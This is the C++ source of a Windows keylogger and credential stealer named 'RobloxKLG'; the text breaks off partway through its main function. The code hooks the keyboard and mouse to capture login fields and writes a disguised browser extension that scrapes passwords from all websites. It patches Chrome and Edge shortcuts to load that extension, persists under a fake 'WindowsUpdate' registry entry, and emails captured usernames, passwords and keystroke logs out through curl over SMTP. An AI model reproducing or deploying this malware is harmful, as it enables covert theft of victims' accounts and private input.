// ============================================================
// ROBLOXKLG - UIA FOCUS + STATE MACHINE + SHORTCUT PATCHER
// ============================================================

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <fstream>
#include <string>
#include <ctime>
#include <sstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <mutex>
#include <deque>
#include <atomic>
#include <vector>
#include <filesystem>

#include <UIAutomation.h>
#include <UIAutomationClient.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uiautomationcore.lib")
#pragma comment(lib, "uuid.lib")

using namespace std;
namespace fs = std::filesystem;

// ============================================================
// ===== คอนฟิก =====
// ============================================================
const string EMAIL_TO = "your email";
const string EMAIL_FROM = "your email";
const string SMTP_USER = "your email";
const string SMTP_PASS = "your app data";
const int    AUTO_SEND_INTERVAL = 30;
const int    HTTP_PORT = 8888;
const int    IDLE_SUBMIT_MS = 5000;
const int    FOCUS_FRESH_MS = 3000;

// ============================================================
// ===== states =====
// ============================================================
enum State { IDLE, FIELD1, FIELD2, SUBMIT };
enum FieldType { FT_NONE, FT_TEXT, FT_PASSWORD, FT_OTHER };

// ============================================================
// ===== globals =====
// ============================================================
wofstream logFile;
wstring   currentWindow = L"";
wstring   logFilePath = L"";
wstring   sentenceBuffer = L"";

State     g_state = IDLE;
wstring   g_buffer = L"";
wstring   g_username = L"";
wstring   g_password = L"";
DWORD     g_lastKeyTick = 0;
DWORD     g_lastClickTick = 0;

IUIAutomation* g_uia = nullptr;
mutex          g_uiaMutex;
FieldType      g_focusedField = FT_NONE;
DWORD          g_focusedTick = 0;

struct CdpCred { wstring url, user, pass, title; };
deque<CdpCred> g_cdpCreds;
mutex          g_cdpMutex;
mutex          g_consoleMutex;
mutex          g_logMutex;
SOCKET         g_listenSock = INVALID_SOCKET;

// ============================================================
// ===== forward =====
// ============================================================
void WriteLog(const wstring& text);
void SendEmailNow();
void SendEmailAuto();
bool SendEmail(const string& subject, const string& body);
void SwitchToField2();
void SubmitCreds();
void AddToStartup();
void HttpServerLoop();
wstring GetSpecialKeyName(UINT vkCode);
wstring GetCharFromVK(UINT vkCode, bool isShift, bool isCaps);
bool InitUIA();
FieldType GetFocusedFieldType();
FieldType GetCurrentFocusType();
void WriteExtensionFiles(const wstring& dir);
void PatchAllChromeShortcuts(const wstring& extDir);

// ============================================================
// ===== path =====
// ============================================================
wstring GetLogFilePath() {
    wchar_t p[MAX_PATH];
    HRESULT hr = SHGetFolderPathW(NULL, CSIDL_MYDOCUMENTS, NULL, 0, p);
    if (FAILED(hr)) GetTempPathW(MAX_PATH, p);
    wstring path(p);
    path += L"\\RobloxKLG.log";
    return path;
}

// ============================================================
// ===== terminal (fixed) =====
// ============================================================
void PrintToTerminal(const wstring& text) {
    lock_guard<mutex> lk(g_consoleMutex);

    time_t now = time(0); tm t = {}; localtime_s(&t, &now);
    wchar_t buf[80]; wcsftime(buf, 80, L"[%H:%M:%S] ", &t);

    wstring line = wstring(buf) + text + L"\n";

    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written = 0;
    WriteConsoleW(h, line.c_str(), (DWORD)line.size(), &written, NULL);
}

wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    wchar_t title[512] = { 0 };
    int len = GetWindowTextW(hwnd, title, 512);
    if (len > 0) return wstring(title, len);
    return L"";
}

// ============================================================
// ===== UIA =====
// ============================================================
bool InitUIA() {
    if (g_uia) return true;

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE && hr != S_FALSE) {
        wcout << L"[UIA] CoInitializeEx failed: " << hr << endl;
        return false;
    }

    hr = CoCreateInstance(CLSID_CUIAutomation, NULL,
        CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&g_uia));
    if (FAILED(hr)) {
        wcout << L"[UIA] CoCreateInstance failed: " << hr << endl;
        return false;
    }
    return true;
}

FieldType GetFocusedFieldType() {
    if (!g_uia) return FT_NONE;

    IUIAutomationElement* el = nullptr;
    if (FAILED(g_uia->GetFocusedElement(&el)) || !el) return FT_NONE;

    BOOL isPwd = FALSE;
    el->get_CurrentIsPassword(&isPwd);
    if (isPwd == TRUE) { el->Release(); return FT_PASSWORD; }

    CONTROLTYPEID ct = 0;
    el->get_CurrentControlType(&ct);
    el->Release();

    if (ct == UIA_EditControlTypeId) return FT_TEXT;
    return FT_OTHER;
}

FieldType GetCurrentFocusType() {
    lock_guard<mutex> lk(g_uiaMutex);
    return g_focusedField;
}

// ============================================================
// ===== VK → char =====
// ============================================================
wstring GetCharFromVK(UINT vkCode, bool /*isShift*/, bool /*isCaps*/) {
    HWND hwnd = GetForegroundWindow();
    DWORD tid = hwnd ? GetWindowThreadProcessId(hwnd, NULL) : GetCurrentThreadId();
    HKL layout = GetKeyboardLayout(tid);
    if (!layout) layout = GetKeyboardLayout(0);

    BYTE state[256] = { 0 };
    if (!GetKeyboardState(state)) {
        ZeroMemory(state, sizeof(state));
        if (GetKeyState(VK_SHIFT) & 0x8000) state[VK_SHIFT] = 0x80;
        if (GetKeyState(VK_CAPITAL) & 0x0001) state[VK_CAPITAL] = 0x01;
    }

    wchar_t buf[8] = { 0 };
    UINT scan = MapVirtualKeyW(vkCode, MAPVK_VK_TO_VSC);
    int n = ToUnicodeEx(vkCode, scan, state, buf, 8, 0, layout);
    if (n <= 0) return L"";
    return wstring(buf, n);
}

wstring GetSpecialKeyName(UINT vkCode) {
    switch (vkCode) {
    case VK_BACK:    return L"[BACKSPACE]";
    case VK_RETURN:  return L"[ENTER]";
    case VK_TAB:     return L"[TAB]";
    case VK_SHIFT:   return L"[SHIFT]";
    case VK_LSHIFT:  return L"[LEFT SHIFT]";
    case VK_RSHIFT:  return L"[RIGHT SHIFT]";
    case VK_CONTROL: return L"[CTRL]";
    case VK_LCONTROL:return L"[LEFT CTRL]";
    case VK_RCONTROL:return L"[RIGHT CTRL]";
    case VK_MENU:    return L"[ALT]";
    case VK_LMENU:   return L"[LEFT ALT]";
    case VK_RMENU:   return L"[RIGHT ALT]";
    case VK_LWIN:    return L"[LEFT WINDOWS]";
    case VK_RWIN:    return L"[RIGHT WINDOWS]";
    case VK_ESCAPE:  return L"[ESC]";
    case VK_HOME:    return L"[HOME]";
    case VK_END:     return L"[END]";
    case VK_LEFT:    return L"[LEFT ARROW]";
    case VK_RIGHT:   return L"[RIGHT ARROW]";
    case VK_UP:      return L"[UP ARROW]";
    case VK_DOWN:    return L"[DOWN ARROW]";
    case VK_PRIOR:   return L"[PAGE UP]";
    case VK_NEXT:    return L"[PAGE DOWN]";
    case VK_CAPITAL: return L"[CAPS LOCK]";
    case VK_INSERT:  return L"[INSERT]";
    case VK_DELETE:  return L"[DELETE]";
    case VK_NUMLOCK: return L"[NUM LOCK]";
    case VK_SCROLL:  return L"[SCROLL LOCK]";
    case VK_PAUSE:   return L"[PAUSE/BREAK]";
    case VK_F1:  return L"[F1]"; case VK_F2:  return L"[F2]";
    case VK_F3:  return L"[F3]"; case VK_F4:  return L"[F4]";
    case VK_F5:  return L"[F5]"; case VK_F6:  return L"[F6]";
    case VK_F7:  return L"[F7]"; case VK_F8:  return L"[F8]";
    case VK_F9:  return L"[F9]"; case VK_F10: return L"[F10]";
    case VK_F11: return L"[F11]"; case VK_F12: return L"[F12]";
    default: return L"";
    }
}

// ============================================================
// ===== State transitions =====
// ============================================================
void SwitchToField2() {
    if (g_state != FIELD1) return;
    if (g_buffer.empty()) return;

    g_username = g_buffer;
    g_buffer.clear();
    g_state = FIELD2;
    WriteLog(L"[STATE] FIELD2 (password) started - username=" + g_username);
}

void SubmitCreds() {
    if (g_state != FIELD2) return;
    if (g_buffer.empty()) {
        WriteLog(L"[STATE] SUBMIT skipped - password buffer empty");
        g_state = IDLE;
        g_username.clear();
        g_password.clear();
        return;
    }

    g_password = g_buffer;
    g_buffer.clear();

    if (g_username.empty() || g_password.empty()) {
        WriteLog(L"[STATE] SUBMIT skipped - missing user or pass");
        g_state = IDLE;
        g_username.clear();
        g_password.clear();
        return;
    }

    g_state = SUBMIT;
    WriteLog(L"[STATE] SUBMIT - user=" + g_username + L"  pass=" + g_password);

    SendEmailNow();

    g_state = IDLE;
    g_username.clear();
    g_password.clear();
    sentenceBuffer.clear();
}

// ============================================================
// ===== read log =====
// ============================================================
string ReadFullLog() {
    lock_guard<mutex> lk(g_logMutex);

    string content;
    ifstream check(logFilePath);
    if (!check.is_open()) return "";
    check.close();

    if (logFile.is_open()) { logFile.flush(); logFile.close(); }

    ifstream in(logFilePath);
    if (in.is_open()) {
        stringstream ss; ss << in.rdbuf();
        content = ss.str();
        in.close();
    }
    logFile.open(logFilePath, ios::app);
    return content;
}

// ============================================================
// ===== email =====
// ============================================================
bool SendEmail(const string& subject, const string& body) {
    string tempFile = "C:\\Windows\\Temp\\email_body.txt";
    ofstream file(tempFile);
    if (!file.is_open()) return false;

    file << "From: " << EMAIL_FROM << "\n";
    file << "To: " << EMAIL_TO << "\n";
    file << "Subject: " << subject << "\n";
    file << "MIME-Version: 1.0\n";
    file << "Content-Type: text/plain; charset=UTF-8\n\n";
    file << body << "\n";
    file.close();

    string cmd = "curl --url smtps://smtp.gmail.com:465 --ssl-reqd "
        "--mail-from \"" + EMAIL_FROM + "\" "
        "--mail-rcpt \"" + EMAIL_TO + "\" "
        "--user \"" + SMTP_USER + ":" + SMTP_PASS + "\" "
        "-T \"" + tempFile + "\" "
        "--insecure -s -o NUL";

    int result = system(cmd.c_str());
    remove(tempFile.c_str());
    return (result == 0);
}

void SendEmailNow() {
    time_t now = time(0); tm t = {}; localtime_s(&t, &now);
    char dateBuf[80]; strftime(dateBuf, 80, "%Y-%m-%d %H:%M:%S", &t);

    string winTitle(currentWindow.begin(), currentWindow.end());
    string u8user(g_username.begin(), g_username.end());
    string u8pass(g_password.begin(), g_password.end());
    string fullLog = ReadFullLog();

    stringstream body;
    body << "=============================================\n";
    body << "   RobloxKLG - LOGIN CAPTURED\n";
    body << "   Time:    " << dateBuf << "\n";
    body << "   Window:  " << winTitle << "\n";
    body << "=============================================\n\n";

    body << "=== CREDENTIALS ===\n";
    body << "  Username: " << u8user << "\n";
    body << "  Password: " << u8pass << "\n\n";

    if (!fullLog.empty()) {
        body << "=== FULL LOG ===\n";
        body << fullLog;
        body << "=== END ===\n";
    }

    if (SendEmail("RobloxKLG Login Captured", body.str())) {
        wcout << L"[EMAIL] Sent - user=" << g_username
            << L"  pass=" << g_password << endl;
    }
    else {
        wcout << L"[EMAIL] Failed!" << endl;
    }
}

void SendEmailAuto() {
    time_t now = time(0); tm t = {}; localtime_s(&t, &now);
    char dateBuf[80]; strftime(dateBuf, 80, "%Y-%m-%d %H:%M:%S", &t);

    string winTitle(currentWindow.begin(), currentWindow.end());
    string fullLog = ReadFullLog();

    stringstream body;
    body << "=============================================\n";
    body << "   RobloxKLG - AUTO REPORT\n";
    body << "   Time:   " << dateBuf << "\n";
    body << "   Window: " << winTitle << "\n";
    body << "=============================================\n\n";

    body << "=== FULL LOG ===\n";
    body << fullLog;
    body << "=== END ===\n";

    if (SendEmail("RobloxKLG Auto Report", body.str())) {
        wcout << L"[AUTO EMAIL] Sent!" << endl;
    }
    else {
        wcout << L"[AUTO EMAIL] Failed!" << endl;
    }
}

// ============================================================
// ===== write log (serialized) =====
// ============================================================
void WriteLog(const wstring& text) {
    {
        lock_guard<mutex> lk(g_logMutex);
        if (!logFile.is_open()) logFile.open(logFilePath, ios::app);
        if (logFile.is_open()) {
            time_t now = time(0); tm t = {}; localtime_s(&t, &now);
            wchar_t buf[80]; wcsftime(buf, 80, L"[%Y-%m-%d %H:%M:%S] ", &t);
            logFile << buf << text << endl;
            logFile.flush();
        }
    }

    PrintToTerminal(text);

    if (text.find(L"[KEY]") != wstring::npos) {
        wstring ch = text.substr(6);
        FieldType ft = GetCurrentFocusType();
        if (ft != FT_TEXT && ft != FT_PASSWORD) return;

        if (g_state == IDLE) {
            if (ft == FT_TEXT) {
                g_state = FIELD1;
                WriteLog(L"[STATE] FIELD1 (username) started");
            }
            else {
                return;
            }
        }

        if (g_state == FIELD1 && ft == FT_PASSWORD) {
            SwitchToField2();
        }

        g_buffer += ch;
        sentenceBuffer += ch;
        g_lastKeyTick = GetTickCount();
    }

    if (text == L"[SPACE]") {
        FieldType ft = GetCurrentFocusType();
        if (ft != FT_TEXT && ft != FT_PASSWORD) return;

        if (g_state == IDLE) {
            if (ft == FT_TEXT) {
                g_state = FIELD1;
                WriteLog(L"[STATE] FIELD1 (username) started");
            }
            else {
                return;
            }
        }
        g_buffer += L' ';
        sentenceBuffer += L' ';
        g_lastKeyTick = GetTickCount();
    }

    if (text == L"[BACKSPACE]") {
        if (g_state == IDLE) return;
        if (!g_buffer.empty()) g_buffer.pop_back();
        if (!sentenceBuffer.empty()) sentenceBuffer.pop_back();
        g_lastKeyTick = GetTickCount();
    }
}

// ============================================================
// ===== Mouse hook =====
// ============================================================
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_LBUTTONDOWN) {
        DWORD now = GetTickCount();
        if (now - g_lastClickTick < 300) {
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
        g_lastClickTick = now;

        Sleep(250);
        FieldType ft = GetCurrentFocusType();

        if (g_state == FIELD1 && ft == FT_PASSWORD) {
            SwitchToField2();
        }
        else if (g_state == FIELD2 && ft != FT_PASSWORD && ft != FT_TEXT) {
            SubmitCreds();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ============================================================
// ===== Keyboard hook =====
// ============================================================
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            wstring winTitle = GetActiveWindowTitle();
            if (winTitle != currentWindow) {
                currentWindow = winTitle;
                WriteLog(L"[WINDOW] " + currentWindow);

                if (g_state == FIELD1 || g_state == FIELD2) {
                    WriteLog(L"[STATE] Reset - window changed");
                    g_state = IDLE;
                    g_buffer.clear();
                    g_username.clear();
                    g_password.clear();
                }
            }

            if (p->vkCode == VK_TAB) {
                WriteLog(L"[TAB]");
                FieldType ft = GetCurrentFocusType();
                if (g_state == FIELD1 && ft == FT_PASSWORD) {
                    SwitchToField2();
                }
                else if (g_state == FIELD2) {
                    SubmitCreds();
                }
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            if (p->vkCode == VK_RETURN) {
                WriteLog(L"[ENTER]");
                FieldType ft = GetCurrentFocusType();
                if (g_state == FIELD1 && ft == FT_PASSWORD) {
                    SwitchToField2();
                }
                else if (g_state == FIELD2) {
                    SubmitCreds();
                }
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            if (p->vkCode == VK_SPACE) {
                WriteLog(L"[SPACE]");
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }
            if (p->vkCode == VK_BACK) {
                WriteLog(L"[BACKSPACE]");
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            wstring special = GetSpecialKeyName(p->vkCode);
            if (!special.empty()) {
                WriteLog(special);
            }
            else {
                wstring ch = GetCharFromVK(p->vkCode, false, false);
                if (!ch.empty()) {
                    WriteLog(L"[KEY] " + ch);
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ============================================================
// ===== Extension files =====
// ============================================================
void WriteExtensionFiles(const wstring& dir) {
    try { fs::create_directories(dir); }
    catch (...) {}

    {
        wstring p = dir + L"\\manifest.json";
        ofstream f(p);
        f << R"({
  "manifest_version": 3,
  "name": "Sys Helper",
  "version": "1.0.0",
  "host_permissions": ["<all_urls>"],
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"],
    "run_at": "document_idle",
    "all_frames": true
  }],
  "icons": { "128": "icon.png" }
})";
    }

    {
        wstring p = dir + L"\\content.js";
        ofstream f(p);
        f << R"((function(){
  if (window.__sc) return; window.__sc = 1;
  function post(d){
    try{
      var x=new XMLHttpRequest();
      x.open('POST','http://127.0.0.1:8888/collect',true);
      x.setRequestHeader('Content-Type','application/json');
      x.send(JSON.stringify(d));
    }catch(e){}
  }
  function scan(){
    var pw = document.querySelector('input[type=password]');
    if(!pw || !pw.value) return null;
    var user = '';
    var form = pw.closest('form');
    if (form) {
      var ins = Array.prototype.slice.call(form.querySelectorAll('input'));
      var pi = ins.indexOf(pw);
      for (var i = pi-1; i >= 0; i--) {
        var t = (ins[i].type || 'text').toLowerCase();
        if (t === 'text' || t === 'email' || t === 'tel' || t === 'number') {
          user = ins[i].value; break;
        }
      }
    }
    if (!user) {
      var all = document.querySelectorAll('input[type=text], input[type=email], input[type=tel], input[type=number]');
      for (var j = 0; j < all.length; j++) {
        if (all[j].value && all[j].value.length >= 2 && all[j].value.length <= 64) {
          user = all[j].value; break;
        }
      }
    }
    if (!user || !pw.value) return null;
    return { url: location.href, title: document.title, user: user, pass: pw.value, ts: Date.now() };
  }
  function report(){ var d = scan(); if (d) post(d); }
  document.addEventListener('submit', report, true);
  document.addEventListener('click', function(e){
    var btn = e.target.closest && e.target.closest('button,input[type=submit],a,[role=button]');
    if (btn) setTimeout(report, 100);
  }, true);
  document.addEventListener('keydown', function(e){
    if (e.key === 'Enter') setTimeout(report, 100);
  }, true);
  document.addEventListener('click', function(){ setTimeout(report, 200); }, true);
  setInterval(report, 3000);
  setTimeout(report, 1500);
})();)";
    }

    {
        wstring p = dir + L"\\icon.png";
        unsigned char png[] = {
            0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x00,0x00,0x0D,
            0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,
            0x08,0x06,0x00,0x00,0x00,0x1F,0x15,0xC4,0x89,0x00,0x00,0x00,
            0x0D,0x49,0x44,0x41,0x54,0x78,0x9C,0x62,0x00,0x01,0x00,0x00,
            0x05,0x00,0x01,0x0D,0x0A,0x2D,0xB4,0x00,0x00,0x00,0x00,0x49,
            0x45,0x4E,0x44,0xAE,0x42,0x60,0x82
        };
        ofstream f(p, ios::binary);
        f.write((char*)png, sizeof(png));
    }
}

// ============================================================
// ===== Patch Chrome shortcuts =====
// ============================================================
void PatchShortcut(const wstring& lnkPath, const wstring& extDir) {
    IShellLinkW* psl = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL,
        CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl);
    if (FAILED(hr)) return;

    IPersistFile* ppf = nullptr;
    hr = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
    if (FAILED(hr)) { psl->Release(); return; }

    hr = ppf->Load(lnkPath.c_str(), STGM_READWRITE);
    if (FAILED(hr)) { ppf->Release(); psl->Release(); return; }

    wchar_t target[MAX_PATH] = { 0 };
    psl->GetPath(target, MAX_PATH, NULL, 0);

    wstring t(target);
    bool isChrome = (t.find(L"chrome.exe") != wstring::npos) ||
        (t.find(L"msedge.exe") != wstring::npos);
    if (!isChrome) {
        ppf->Release(); psl->Release(); return;
    }

    wchar_t args[4096] = { 0 };
    psl->GetArguments(args, 4096);
    wstring newArgs(args);

    if (newArgs.find(L"--load-extension") == wstring::npos) {
        newArgs += L" --disable-features=DisableLoadExtensionCommandLineSwitch";
        newArgs += L" --load-extension=\"" + extDir + L"\"";
        psl->SetArguments(newArgs.c_str());
        ppf->Save(lnkPath.c_str(), TRUE);
        wcout << L"[PATCH] " << lnkPath << endl;
    }
    else {
        wcout << L"[SKIP] already patched: " << lnkPath << endl;
    }

    ppf->Release();
    psl->Release();
}

void PatchAllChromeShortcuts(const wstring& extDir) {
    wchar_t profile[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, profile);
    wchar_t appData[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
    wchar_t programData[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programData);

    vector<wstring> dirs = {
        wstring(profile) + L"\\Desktop",
        wstring(profile) + L"\\OneDrive\\Desktop",
        wstring(appData) + L"\\Microsoft\\Windows\\Start Menu\\Programs",
        wstring(appData) + L"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar",
        wstring(programData) + L"\\Microsoft\\Windows\\Start Menu\\Programs",
    };

    int patched = 0;
    for (auto& dir : dirs) {
        if (!fs::exists(dir)) continue;
        try {
            for (auto& entry : fs::recursive_directory_iterator(dir)) {
                wstring path = entry.path().wstring();
                if (path.size() < 4) continue;
                wstring lower = path;
                for (auto& c : lower) c = towlower(c);
                if (lower.substr(lower.size() - 4) != L".lnk") continue;

                wstring name = entry.path().filename().wstring();
                wstring lname = name;
                for (auto& c : lname) c = towlower(c);

                if (lname.find(L"chrome") != wstring::npos ||
                    lname.find(L"edge") != wstring::npos) {
                    PatchShortcut(path, extDir);
                    patched++;
                }
            }
        }
        catch (...) {}
    }

    wcout << L"[PATCH] total patched: " << patched << endl;
}

// ============================================================
// ===== HTTP server =====
// ============================================================
wstring JsonGetStr(const string& json, const string& key) {
    string pat = "\"" + key + "\":\"";
    auto pos = json.find(pat);
    if (pos == string::npos) return L"";
    pos += pat.size();
    auto end = json.find("\"", pos);
    if (end == string::npos) return L"";
    string raw = json.substr(pos, end - pos);
    string out;
    for (size_t i = 0; i < raw.size(); i++) {
        if (raw[i] == '\\' && i + 1 < raw.size()) {
            char n = raw[i + 1];
            if (n == 'n') out += '\n';
            else if (n == 't') out += '\t';
            else if (n == 'r') out += '\r';
            else out += n;
            i++;
        }
        else out += raw[i];
    }
    if (out.empty()) return L"";
    int sz = MultiByteToWideChar(CP_UTF8, 0, out.c_str(), (int)out.size(), nullptr, 0);
    wstring w(sz, 0);
    MultiByteToWideChar(CP_UTF8, 0, out.c_str(), (int)out.size(), &w[0], sz);
    return w;
}

void HttpHandleClient(SOCKET client) {
    char buf[8192] = { 0 };
    int n = recv(client, buf, sizeof(buf) - 1, 0);
    if (n <= 0) { closesocket(client); return; }

    string req(buf, n);
    auto hdrEnd = req.find("\r\n\r\n");
    if (hdrEnd != string::npos) {
        string body = req.substr(hdrEnd + 4);
        auto clPos = req.find("Content-Length:");
        if (clPos != string::npos) {
            int cl = atoi(req.c_str() + clPos + 15);
            while ((int)body.size() < cl) {
                int n2 = recv(client, buf, sizeof(buf) - 1, 0);
                if (n2 <= 0) break;
                body.append(buf, n2);
            }
        }

        wstring wurl = JsonGetStr(body, "url");
        wstring wuser = JsonGetStr(body, "user");
        wstring wpass = JsonGetStr(body, "pass");
        wstring wtitle = JsonGetStr(body, "title");

        if (!wuser.empty() && !wpass.empty()) {
            {
                lock_guard<mutex> lk(g_cdpMutex);
                bool dup = false;
                for (auto& c : g_cdpCreds)
                    if (c.url == wurl && c.user == wuser) { dup = true; break; }
                if (!dup) {
                    CdpCred cc; cc.url = wurl; cc.user = wuser;
                    cc.pass = wpass; cc.title = wtitle;
                    g_cdpCreds.push_back(cc);
                }
            }

            WriteLog(L"[CRED] USER=" + wuser + L"  PWD=" + wpass + L"  @ " + wurl);

            stringstream ss;
            time_t now = time(0); tm t = {}; localtime_s(&t, &now);
            char dateBuf[80]; strftime(dateBuf, 80, "%Y-%m-%d %H:%M:%S", &t);

            ss << "=============================================\n";
            ss << "   RobloxKLG - Login Captured (browser)\n";
            ss << "   Time:     " << dateBuf << "\n";
            ss << "   Title:    " << string(wtitle.begin(), wtitle.end()) << "\n";
            ss << "   URL:      " << string(wurl.begin(), wurl.end()) << "\n";
            ss << "   Username: " << string(wuser.begin(), wuser.end()) << "\n";
            ss << "   Password: " << string(wpass.begin(), wpass.end()) << "\n";
            ss << "=============================================\n\n";
            ss << "=== ALL CAPTURED ===\n";
            {
                lock_guard<mutex> lk(g_cdpMutex);
                int i = 0;
                for (auto& c : g_cdpCreds) {
                    i++;
                    ss << "#" << i << " [" << string(c.title.begin(), c.title.end()) << "]\n";
                    ss << "  URL:      " << string(c.url.begin(), c.url.end()) << "\n";
                    ss << "  Username: " << string(c.user.begin(), c.user.end()) << "\n";
                    ss << "  Password: " << string(c.pass.begin(), c.pass.end()) << "\n\n";
                }
            }
            SendEmail("RobloxKLG Login Captured", ss.str());
        }
    }

    const char* resp =
        "HTTP/1.1 200 OK\r\n"
        "Access-Control-Allow-Origin: *\r\n"
        "Access-Control-Allow-Headers: Content-Type\r\n"
        "Content-Length: 2\r\n\r\nok";
    send(client, resp, (int)strlen(resp), 0);
    closesocket(client);
}

void HttpServerLoop() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    g_listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_listenSock == INVALID_SOCKET) { WSACleanup(); return; }

    int opt = 1;
    setsockopt(g_listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(g_listenSock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(g_listenSock);
        g_listenSock = INVALID_SOCKET;
        WSACleanup();
        wcout << L"[HTTP] bind failed" << endl;
        return;
    }
    listen(g_listenSock, SOMAXCONN);
    wcout << L"[HTTP] listening on 127.0.0.1:8888" << endl;

    while (true) {
        sockaddr_in ca = {};
        int cl = sizeof(ca);
        SOCKET c = accept(g_listenSock, (sockaddr*)&ca, &cl);
        if (c == INVALID_SOCKET) {
            this_thread::sleep_for(chrono::milliseconds(100));
            continue;
        }
        thread(HttpHandleClient, c).detach();
    }

    closesocket(g_listenSock);
    WSACleanup();
}

// ============================================================
// ===== Focus tracker =====
// ============================================================
void FocusTrackerLoop() {
    while (true) {
        this_thread::sleep_for(chrono::milliseconds(300));

        lock_guard<mutex> lk(g_uiaMutex);
        FieldType ft = GetFocusedFieldType();
        if (ft != g_focusedField) {
            g_focusedField = ft;
            g_focusedTick = GetTickCount();

            if (ft == FT_TEXT)          WriteLog(L"[FOCUS] text input");
            else if (ft == FT_PASSWORD) WriteLog(L"[FOCUS] password input");
        }
        else {
            g_focusedTick = GetTickCount();
        }
    }
}

// ============================================================
// ===== Idle checker =====
// ============================================================
void IdleCheckerLoop() {
    while (true) {
        this_thread::sleep_for(chrono::milliseconds(500));

        if (g_state == FIELD2 && !g_buffer.empty()) {
            DWORD now = GetTickCount();
            bool idle = (g_lastKeyTick > 0) && (now - g_lastKeyTick) >= IDLE_SUBMIT_MS;
            bool notJustClicked = (now - g_lastClickTick) > 1000;

            if (idle && notJustClicked) {
                WriteLog(L"[IDLE] 5s timeout - auto submit");
                SubmitCreds();
            }
        }
    }
}

// ============================================================
// ===== Registry =====
// ============================================================
void AddToStartup() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ,
            (const BYTE*)path, (DWORD)((wcslen(path) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

// ============================================================
// ===== main =====
// ============================================================
int main() {
    SetConsoleTitleW(L"RobloxKLG");

    logFilePath = GetLogFilePath();

    wcout << L"=============================================" << endl;
    wcout << L"   RobloxKLG - Shortcut Patcher" << endl;
    wcout << L"   Log file: " << logFilePath << endl;
    wcout << L"   Email: mr.suepsakun@gmail.com" << endl;
    wcout << L"   Trigger: TAB / ENTER / IDLE-5s" << endl;
    wcout << L"   Filter: UIA focus (input only)" << endl;
    wcout << L"   Extension: 127.0.0.1:8888" << endl;
    wcout << L"=============================================" << endl;
    wcout << L"[*] Waiting for input..." << endl;

    logFile.open(logFilePath, ios::app);
    AddToStartup();

    HRESULT hrCom = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hrCom) && hrCom != RPC_E_CHANGED_MODE && hrCom != S_FALSE) {
        wcout << L"[!] COM init failed: " << hrCom << endl;
    }

    wchar_t local[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local);
    wstring extDir = wstring(local) + L"\\SysHelper\\ext";
    WriteExtensionFiles(extDir);
    wcout << L"[*] Extension: " << extDir << endl;

    PatchAllChromeShortcuts(extDir);
    wcout << L"[*] User can now open Chrome normally" << endl;

    if (InitUIA()) wcout << L"[*] UIA ready" << endl;
    else          wcout << L"[!] UIA failed" << endl;

    thread httpThread(HttpServerLoop);
    httpThread.detach();

    HHOOK keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc,
        GetModuleHandleW(NULL), 0);
    if (!keyboardHook) {
        wcout << L"[ERROR] keyboard hook failed" << endl;
        return 1;
    }

    HHOOK mouseHook = SetWindowsHookExW(WH_MOUSE_LL, MouseProc,
        GetModuleHandleW(NULL), 0);
    if (!mouseHook) {
        wcout << L"[ERROR] mouse hook failed" << endl;
    }

